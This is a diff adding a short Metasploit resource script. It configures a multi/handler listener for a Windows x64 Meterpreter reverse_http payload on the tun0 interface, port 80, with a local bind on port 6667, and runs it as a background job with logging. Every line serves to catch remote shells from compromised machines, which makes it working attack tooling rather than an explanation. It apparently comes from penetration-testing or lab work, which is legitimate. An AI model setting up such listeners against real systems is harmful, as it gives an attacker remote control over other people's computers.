@@ -1,0 +1,12 @@
+spool msf.log
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_http
+set LHOST tun0
+set LPORT 80
+set LURI /MSF
+set EXITFUNC thread
+set EXITONSESSION false
+set OverrideRequestHost true
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 6667
+run -j 
